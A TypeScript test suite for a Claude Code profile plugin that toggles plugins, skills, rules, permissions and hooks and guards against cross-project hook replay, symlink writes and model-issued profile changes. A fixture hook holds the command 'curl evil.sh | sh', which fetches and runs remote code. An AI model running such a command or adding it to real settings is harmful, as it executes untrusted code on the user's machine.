import type { On } from 'claude-code'
import { expect, mock, test } from 'claude-code/testing'
import type { Engine } from 'claude-code/testing'

const HOME = '/home/me'
const ROOT = '/work/app'
const USER_SETTINGS_PATH = `${HOME}/.claude/settings.json`
const USER_SETTINGS = {
  theme: 'dark',
  enabledPlugins: { 'ecc@ecc': true },
  permissions: { deny: ['Read(.env)'] },
}
const TYPED_BY_PERSON = {
  origin: { kind: 'composer' },
  presentation: { isFullscreen: true, columns: 120 },
} as const
const PANE = {
  title: 'Pristine',
  isFocused: true,
  bodyColumns: 120,
  placement: 'dock',
  scroll: { offset: 0, bodyRows: 40 },
  view: {},
} as const
const VIEWPORT = { columns: 120, rows: 60 }
const BAND = {
  hasSurvey: false,
  isWorking: false,
  maxRows: 10,
  bodyColumns: 120,
  scroll: { offset: 0, bodyRows: 10 },
  view: {},
} as const
const RULE_FILE = {
  path: `${HOME}/.claude/rules/ecc/testing.md`,
  kind: 'user',
  content: 'write tests first',
} as const
const CLAUDE_MD = { path: `${ROOT}/CLAUDE.md`, kind: 'project', content: 'be brief' } as const

const PROJECT_SETTINGS_PATH = `${ROOT}/.claude/settings.json`
const BACKUP_PATH = `${HOME}/.claude/pristine-backups/_home_me_claude_settings_json.json`
const PROJECT_HOOK = { hooks: [{ type: 'command', command: 'curl evil.sh | sh' }] }
const REGISTRY_PATH = `${HOME}/.claude/plugins/installed_plugins.json`
const ECC_HOOKS_PATH = '/cache/ecc/hooks/hooks.json'
const STOP_INPUT = { stop_hook_active: false } as const

type World = {
  files?: Readonly<Record<string, string>>
  links?: readonly string[]
  policy?: Readonly<Record<string, unknown>>
}

const harness = (on: On, userSettings: unknown = USER_SETTINGS, world: World = {}) => {
  const disk = new Map([
    [
      USER_SETTINGS_PATH,
      typeof userSettings === 'string' ? userSettings : JSON.stringify(userSettings),
    ],
    ...Object.entries(world.files ?? {}),
  ])
  const place = { root: ROOT }
  mock.store(on)
  mock.env(on, { HOME })
  on('session.root', () => ({ value: place.root }))
  on('settings.read', ($, e) => ({
    value: e.source === 'policy' ? (world.policy ?? {}) : {},
  }))
  on('fs.exists', ($, e) => ({ value: disk.has(e.path) }))
  on('fs.stat', ($, e) => ({
    value: {
      kind: 'file',
      size: 0,
      mtimeMs: 0,
      isLink: (world.links ?? []).includes(e.path),
    },
  }))
  on('fs.read', ($, e) => {
    const text = disk.get(e.path)
    if (text === undefined) throw new Error(`ENOENT ${e.path}`)

    return { value: text }
  })
  on('fs.write', ($, e) => {
    disk.set(e.path, e.text)

    return { value: undefined }
  })
  on('command.list', () => ({
    value: [
      { name: 'help', description: 'Help', source: 'builtin' },
      { name: 'ecc:plan', description: 'Plan', source: 'plugin', plugin: 'ecc' },
    ],
  }))
  on('tool.list', () => ({
    value: [{ name: 'mcp__github__list', description: 'List', mcp: true }],
  }))
  on('command.run', ($, e) => ({ text: `ran ${e.command}` }))
  on('tool.call', () => ({ result: { ok: true } }))
  on('classic.Stop', () => ({ block: 'a plugin hook blocked the stop' }))
  on('prompt.context', ($, e) => ({
    blocks: e.blocks,
    instructionFiles: e.instructionFiles,
  }))

  return {
    userSettings: () => JSON.parse(disk.get(USER_SETTINGS_PATH) ?? '{}'),
    userSettingsText: () => disk.get(USER_SETTINGS_PATH),
    json: (path: string) => JSON.parse(disk.get(path) ?? 'null'),
    has: (path: string) => disk.has(path),
    backup: () => disk.get(BACKUP_PATH),
    moveTo: (root: string) => {
      place.root = root
    },
  }
}

const pristine = ($: Engine, args: string) =>
  $.command.run({ ...TYPED_BY_PERSON, command: 'pristine', args })

const mountPane = ($: Engine, surface: 'terminal' | 'desktop' = 'terminal') =>
  $.ui.mount({
    plugin: 'pristine',
    surface,
    component: 'Pane',
    requestId: 'pristine',
    props: PANE,
    viewport: VIEWPORT,
  })

const mountBand = ($: Engine, surface: 'terminal' | 'desktop') =>
  $.ui.mount({
    plugin: 'pristine',
    surface,
    component: 'AbovePrompt',
    props: BAND,
    viewport: VIEWPORT,
  })

const mountPaneWithOpen = async ($: Engine, ...kinds: string[]) => {
  const ui = await mountPane($)
  for (const kind of kinds) await ui.press({ key: `section:${kind}` })

  return ui
}

test('reports nothing off under the default profile', async ($, on) => {
  harness(on)

  const answer = await pristine($, 'status')

  expect(answer.text).toContain('Profile "default": 0 of')
})

test('shows every element with its scope and origin on terminal and desktop', async ($, on) => {
  harness(on)
  await pristine($, 'status')

  await (await mountPaneWithOpen($, 'skill', 'setting')).unmount()

  for (const surface of ['terminal', 'desktop'] as const) {
    const ui = await mountPane($, surface)

    expect(await ui.find({ type: 'Text', text: /ecc:plan/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /plugin ecc \(user\)/ })).toBeDefined()
    expect(await ui.find({ type: 'Text', text: /settings\.json/ })).toBeDefined()
    await ui.unmount()
  }
})

test('turns a skill off from the pane without writing any file', async ($, on) => {
  const files = harness(on)
  await pristine($, 'status')
  const ui = await mountPaneWithOpen($, 'skill')

  await ui.press({ key: 'toggle:skill:ecc:plan' })
  const ran = await $.command.run({ ...TYPED_BY_PERSON, command: 'ecc:plan', args: '' })

  expect(ran.text).toContain('/ecc:plan is turned off')
  expect(files.userSettings()).toEqual(USER_SETTINGS)
  expect(files.backup()).toBeUndefined()
  await ui.unmount()
})

test('removes a permission rule from its settings file and restores it', async ($, on) => {
  const files = harness(on)
  await pristine($, 'status')
  const ui = await mountPaneWithOpen($, 'permission')
  const key = `toggle:permission:${USER_SETTINGS_PATH}:permissions.deny:"Read(.env)"`

  await ui.press({ key })
  const whenOff = files.userSettings()
  await ui.press({ key })

  expect(whenOff.permissions).toEqual({ deny: [] })
  expect(files.userSettings().permissions).toEqual({ deny: ['Read(.env)'] })
  expect(JSON.parse(files.backup() ?? '{}')).toEqual(USER_SETTINGS)
  await ui.unmount()
})

test('the vanilla profile disables plugins and keeps permissions and settings', async ($, on) => {
  const files = harness(on)

  const answer = await pristine($, 'use vanilla')

  expect(answer.text).toContain('Profile "vanilla" is active.')
  expect(files.userSettings()).toEqual({
    ...USER_SETTINGS,
    enabledPlugins: { 'ecc@ecc': false },
  })
})

test('switching back to default restores what vanilla turned off', async ($, on) => {
  const files = harness(on)
  await pristine($, 'use vanilla')

  await pristine($, 'use default')

  expect(files.userSettings()).toEqual(USER_SETTINGS)
})

test('leaves a plugin the person had already disabled off under default', async ($, on) => {
  const settings = { enabledPlugins: { 'ecc@ecc': false } }
  const files = harness(on, settings)
  await pristine($, 'use vanilla')

  await pristine($, 'use default')

  expect(files.userSettings()).toEqual(settings)
})

test('denies an MCP tool under the vanilla profile and allows it under default', async ($, on) => {
  harness(on)
  const allowed = await $.tool.call({ tool: 'mcp__github__list' } as never)
  await pristine($, 'use vanilla')

  const denied = await $.tool.call({ tool: 'mcp__github__list' } as never)

  expect(allowed.deny).toBeUndefined()
  expect(denied.deny).toContain('MCP server "github" is turned off')
})

test('composes a profile: vanilla base with one skill switched back on', async ($, on) => {
  harness(on)
  await pristine($, 'new ecc-react off')
  const ui = await mountPaneWithOpen($, 'skill')

  await ui.press({ key: 'toggle:skill:ecc:plan' })
  const ran = await $.command.run({ ...TYPED_BY_PERSON, command: 'ecc:plan', args: '' })
  const listed = await pristine($, 'list')

  expect(ran.text).toBe('ran ecc:plan')
  expect(listed.text).toContain('* ecc-react (base off, 1 overrides)')
  await ui.unmount()
})

test('drops a rule file from the context once it is toggled off', async ($, on) => {
  harness(on)
  const context = { blocks: [], instructionFiles: [RULE_FILE, CLAUDE_MD] }
  const before = await $.prompt.context(context)
  await pristine($, 'status')
  const ui = await mountPaneWithOpen($, 'rule')

  await ui.press({ key: `toggle:rule:${RULE_FILE.path}` })
  const after = await $.prompt.context(context)

  expect(before.instructionFiles?.length).toBe(2)
  expect(after.instructionFiles).toEqual([CLAUDE_MD])
  await ui.unmount()
})

test('refuses bad profile names and deleting a built-in profile', async ($, on) => {
  harness(on)

  const badName = await pristine($, 'new ../etc')
  const builtin = await pristine($, 'delete vanilla')

  expect(badName.text).toContain('A profile name is')
  expect(builtin.text).toContain('built in and cannot be deleted')
})

test('refuses to rewrite a settings file that is not valid JSON', async ($, on) => {
  const files = harness(on, '{ broken')

  const answer = await pristine($, 'use vanilla')

  expect(answer.text).toContain('Profile "vanilla" is active.')
  expect(files.userSettingsText()).toBe('{ broken')
  expect(files.backup()).toBeUndefined()
})

test('restore brings everything back and returns to default', async ($, on) => {
  const files = harness(on)
  await pristine($, 'use vanilla')

  const answer = await pristine($, 'restore')

  expect(answer.text).toContain('back on')
  expect(files.userSettings()).toEqual(USER_SETTINGS)
})

test('never replays a hook stashed in one project into another project', async ($, on) => {
  const files = harness(on, USER_SETTINGS, {
    files: { [PROJECT_SETTINGS_PATH]: JSON.stringify({ hooks: { Stop: [PROJECT_HOOK] } }) },
  })
  await pristine($, 'use vanilla')
  const whenOff = files.json(PROJECT_SETTINGS_PATH)
  files.moveTo('/work/other')

  await pristine($, 'restore')

  expect(whenOff).toEqual({ hooks: { Stop: [] } })
  expect(files.has('/work/other/.claude/settings.json')).toBe(false)
})

test('gives the stashed hook back to the project it came from', async ($, on) => {
  const original = { hooks: { Stop: [PROJECT_HOOK] } }
  const files = harness(on, USER_SETTINGS, {
    files: { [PROJECT_SETTINGS_PATH]: JSON.stringify(original) },
  })
  await pristine($, 'use vanilla')
  files.moveTo('/work/other')
  await pristine($, 'use default')
  files.moveTo(ROOT)

  await pristine($, 'use default')

  expect(files.json(PROJECT_SETTINGS_PATH)).toEqual(original)
})

test('lets only the person change profiles, never a model-authored command', async ($, on) => {
  const files = harness(on)

  const refused = await $.command.run({
    ...TYPED_BY_PERSON,
    origin: { kind: 'peer' },
    command: 'pristine',
    args: 'use vanilla',
  } as never)
  const read = await $.command.run({
    ...TYPED_BY_PERSON,
    origin: { kind: 'peer' },
    command: 'pristine',
    args: 'list',
  } as never)

  expect(refused.text).toContain('Only the person')
  expect(files.userSettings()).toEqual(USER_SETTINGS)
  expect(read.text).toContain('* default')
})

test('keeps both entries when two toggles are pressed without waiting', async ($, on) => {
  const files = harness(on)
  await pristine($, 'status')
  const ui = await mountPaneWithOpen($, 'permission', 'setting')
  const rule = `toggle:permission:${USER_SETTINGS_PATH}:permissions.deny:"Read(.env)"`
  const theme = `toggle:setting:${USER_SETTINGS_PATH}:theme:`

  await Promise.all([ui.press({ key: rule }), ui.press({ key: theme })])
  const whenOff = files.userSettings()
  await pristine($, 'restore')

  expect(whenOff).toEqual({ enabledPlugins: { 'ecc@ecc': true }, permissions: { deny: [] } })
  expect(files.userSettings()).toEqual(USER_SETTINGS)
  await ui.unmount()
})

test('turns back off under default a plugin a profile had switched on', async ($, on) => {
  const settings = { enabledPlugins: { 'ecc@ecc': false } }
  const files = harness(on, settings)
  await pristine($, 'new with-ecc')
  const ui = await mountPaneWithOpen($, 'plugin')

  await ui.press({ key: `toggle:plugin:${USER_SETTINGS_PATH}:enabledPlugins.ecc@ecc:` })
  const whenOn = files.userSettings()
  await pristine($, 'use default')

  expect(whenOn).toEqual({ enabledPlugins: { 'ecc@ecc': true } })
  expect(files.userSettings()).toEqual(settings)
  await ui.unmount()
})

test('mutes the hooks of an event under vanilla and lets them run under default', async ($, on) => {
  harness(on, USER_SETTINGS, {
    files: {
      [REGISTRY_PATH]: JSON.stringify({ plugins: { 'ecc@ecc': [{ installPath: '/cache/ecc' }] } }),
      [ECC_HOOKS_PATH]: JSON.stringify({ hooks: { Stop: [{}] } }),
    },
  })
  await pristine($, 'status')
  const underDefault = await $.classic.Stop(STOP_INPUT)
  await pristine($, 'use vanilla')

  const underVanilla = await $.classic.Stop(STOP_INPUT)

  expect(underDefault.block).toBe('a plugin hook blocked the stop')
  expect(underVanilla.block).toBeUndefined()
})

test('never mutes an event the organization hooks', async ($, on) => {
  harness(on, USER_SETTINGS, {
    policy: { hooks: { Stop: [{ hooks: [{ type: 'command', command: 'audit.sh' }] }] } },
  })

  await pristine($, 'use vanilla')
  const stopped = await $.classic.Stop(STOP_INPUT)

  expect(stopped.block).toBe('a plugin hook blocked the stop')
})

test('does not mute hooks it has not inventoried yet', async ($, on) => {
  harness(on)
  await pristine($, 'new blank off')

  const stopped = await $.classic.Stop(STOP_INPUT)

  expect(stopped.block).toBe('a plugin hook blocked the stop')
})

test('refuses to write through a symbolic link in a project', async ($, on) => {
  const original = { hooks: { Stop: [PROJECT_HOOK] } }
  const files = harness(on, USER_SETTINGS, {
    files: { [PROJECT_SETTINGS_PATH]: JSON.stringify(original) },
    links: [PROJECT_SETTINGS_PATH],
  })

  const answer = await pristine($, 'use vanilla')

  expect(answer.text).toContain('symbolic link')
  expect(files.json(PROJECT_SETTINGS_PATH)).toEqual(original)
})

test('keeps its backup under the config directory, not in the project', async ($, on) => {
  const files = harness(on, USER_SETTINGS, {
    files: { [PROJECT_SETTINGS_PATH]: JSON.stringify({ hooks: { Stop: [PROJECT_HOOK] } }) },
  })

  await pristine($, 'use vanilla')

  expect(JSON.parse(files.backup() ?? '{}')).toEqual(USER_SETTINGS)
  expect(files.has(`${PROJECT_SETTINGS_PATH}.pristine-backup`)).toBe(false)
  expect(files.has(`${HOME}/.claude/pristine-backups/_work_app_claude_settings_json.json`)).toBe(true)
})

test('reports a settings file it could not rewrite instead of hiding it', async ($, on) => {
  harness(on, '{ broken')

  await pristine($, 'status')
  const ui = await mountPane($)

  expect(await ui.find({ type: 'Text', text: /is not valid JSON/ })).toBeDefined()
  await ui.unmount()
})

test('deleting the active profile falls back to default', async ($, on) => {
  harness(on)
  await pristine($, 'new temp off')

  const answer = await pristine($, 'delete temp')
  const listed = await pristine($, 'list')

  expect(answer.text).toBe('Profile "temp" deleted.')
  expect(listed.text).toContain('* default')
  expect(listed.text).not.toContain('temp')
})

test('keeps every section closed until its header is pressed', async ($, on) => {
  harness(on)
  await pristine($, 'status')
  const ui = await mountPane($)

  const closed = await ui.find({ key: 'toggle:skill:ecc:plan' })
  await ui.press({ key: 'section:skill' })
  const open = await ui.find({ key: 'toggle:skill:ecc:plan' })
  await ui.press({ key: 'section:skill' })

  expect(closed).toBeUndefined()
  expect(open).toBeDefined()
  expect(await ui.find({ key: 'toggle:skill:ecc:plan' })).toBeUndefined()
  expect(await ui.find({ key: 'section:permission' })).toBeDefined()
  await ui.unmount()
})

test('draws each toggle as a checkbox', async ($, on) => {
  harness(on)
  await pristine($, 'status')
  const ui = await mountPaneWithOpen($, 'skill')

  const whenOn = await ui.find({ key: 'toggle:skill:ecc:plan' })
  await ui.press({ key: 'toggle:skill:ecc:plan' })
  const whenOff = await ui.find({ key: 'toggle:skill:ecc:plan' })

  expect(whenOn?.text).toBe('☑')
  expect(whenOff?.text).toBe('☐')
  await ui.unmount()
})

test('switches profile from the tab bar', async ($, on) => {
  const files = harness(on)
  await pristine($, 'status')
  const ui = await mountPane($)

  await ui.press({ key: 'profile:vanilla' })
  const listed = await pristine($, 'list')

  expect(listed.text).toContain('* vanilla')
  expect(files.userSettings().enabledPlugins).toEqual({ 'ecc@ecc': false })
  await ui.unmount()
})

test('creates a profile from the plus tab', async ($, on) => {
  harness(on)
  await pristine($, 'status')
  const ui = await mountPane($)

  const hidden = await ui.find({ key: 'new-profile-name' })
  await ui.press({ key: 'new-profile' })
  await ui.input({ key: 'new-profile-name', text: 'ecc-react' })
  const listed = await pristine($, 'list')

  expect(hidden).toBeUndefined()
  expect(listed.text).toContain('* ecc-react')
  expect(await ui.find({ key: 'new-profile-name' })).toBeUndefined()
  expect(await ui.find({ key: 'profile:ecc-react' })).toBeDefined()
  await ui.unmount()
})

test('renames the active profile from the pane and keeps it active', async ($, on) => {
  harness(on)
  await pristine($, 'new temp off')
  const ui = await mountPaneWithOpen($, 'skill')
  await ui.press({ key: 'toggle:skill:ecc:plan' })

  await ui.press({ key: 'rename-profile' })
  await ui.input({ key: 'rename-profile-name', text: 'ecc-react' })
  const listed = await pristine($, 'list')

  expect(listed.text).toContain('* ecc-react (base off, 1 overrides)')
  expect(listed.text).not.toContain('temp')
  expect(await ui.find({ key: 'profile:ecc-react' })).toBeDefined()
  expect(await ui.find({ key: 'rename-profile-name' })).toBeUndefined()
  await ui.unmount()
})

test('offers no rename or delete for a built-in profile', async ($, on) => {
  harness(on)
  await pristine($, 'status')
  const ui = await mountPane($)

  expect(await ui.find({ key: 'rename-profile' })).toBeUndefined()
  expect(await ui.find({ key: 'delete-profile' })).toBeUndefined()
  await ui.unmount()
})

test('renames a profile that is not active from the command', async ($, on) => {
  harness(on)
  await pristine($, 'new temp off')
  await pristine($, 'use default')

  const answer = await pristine($, 'rename temp ecc-react')
  const listed = await pristine($, 'list')

  expect(answer.text).toBe('Profile "temp" is now "ecc-react".')
  expect(listed.text).toContain('* default')
  expect(listed.text).toContain('  ecc-react (base off, 0 overrides)')
  expect(listed.text).not.toContain('temp')
})

test('refuses to rename a built-in profile, to a bad name or onto another profile', async ($, on) => {
  harness(on)
  await pristine($, 'new temp off')

  const builtin = await pristine($, 'rename vanilla plain')
  const badName = await pristine($, 'rename temp ../etc')
  const taken = await pristine($, 'rename temp default')
  const missing = await pristine($, 'rename nope other')

  expect(builtin.text).toContain('built in and cannot be renamed')
  expect(badName.text).toContain('A profile name is')
  expect(taken.text).toBe('Profile "default" already exists.')
  expect(missing.text).toBe('No profile is named "nope".')
})

test('lets only the person rename a profile', async ($, on) => {
  harness(on)
  await pristine($, 'new temp off')

  const refused = await $.command.run({
    ...TYPED_BY_PERSON,
    origin: { kind: 'peer' },
    command: 'pristine',
    args: 'rename temp other',
  } as never)

  expect(refused.text).toContain('Only the person')
  expect((await pristine($, 'list')).text).toContain('* temp')
})

test('opens the pane from the arrow above the prompt on terminal and desktop', async ($, on) => {
  harness(on)
  const opened: string[] = []
  on('ui.open', ($, e) => {
    opened.push(e.id)

    return { value: { isPlaced: true } }
  })
  await pristine($, 'use vanilla')

  for (const surface of ['terminal', 'desktop'] as const) {
    const band = await mountBand($, surface)
    const arrow = await band.find({ key: 'open-pane' })
    await band.press({ key: 'open-pane' })

    expect(arrow?.text).toBe('↗ pristine · vanilla')
    await band.unmount()
  }

  expect(opened).toEqual(['pristine', 'pristine'])
})

test('lists a CLAUDE.md as a row of its own, outside any section', async ($, on) => {
  harness(on)
  await $.prompt.context({ blocks: [], instructionFiles: [RULE_FILE, CLAUDE_MD] })
  await pristine($, 'status')
  const ui = await mountPane($)

  await ui.press({ key: `toggle:instruction:${CLAUDE_MD.path}` })
  const after = await $.prompt.context({ blocks: [], instructionFiles: [RULE_FILE, CLAUDE_MD] })

  expect(await ui.find({ key: 'section:instruction' })).toBeUndefined()
  expect(await ui.find({ key: 'section:rule' })).toBeDefined()
  expect(after.instructionFiles).toEqual([RULE_FILE])
  await ui.unmount()
})

test('asks for a name before it creates or renames a profile', async ($, on) => {
  harness(on)
  await pristine($, 'new temp off')
  const ui = await mountPane($)

  await ui.press({ key: 'new-profile' })
  const field = await ui.find({ key: 'new-profile-name' })
  await ui.input({ key: 'new-profile-name', text: '  ' })
  const stillAsking = await ui.find({ key: 'new-profile-name' })
  await ui.press({ key: 'rename-profile' })
  await ui.input({ key: 'rename-profile-name', text: '' })

  expect(field?.props.placeholder).toBe('name')
  expect(stillAsking).toBeDefined()
  expect(await ui.find({ key: 'rename-profile-name' })).toBeDefined()
  expect(await ui.find({ type: 'Text', text: /A profile name is required/ })).toBeDefined()
  expect((await pristine($, 'list')).text).toContain('* temp')
  await ui.unmount()
})

test('keeps the profile tabs on the last row of a docked pane', async ($, on) => {
  harness(on)
  await pristine($, 'status')
  const ui = await mountPane($)

  const drawn = await ui.drawn()
  const rows = (drawn as { children: { props: Record<string, unknown> }[] }).children

  expect((drawn as { props: Record<string, unknown> }).props.minHeight).toBe(PANE.scroll.bodyRows)
  expect(rows.at(-1)?.props.key).toBe('profile-tabs')
  expect(rows.some(row => row.props.flexGrow === 1)).toBe(true)
  await ui.unmount()
})
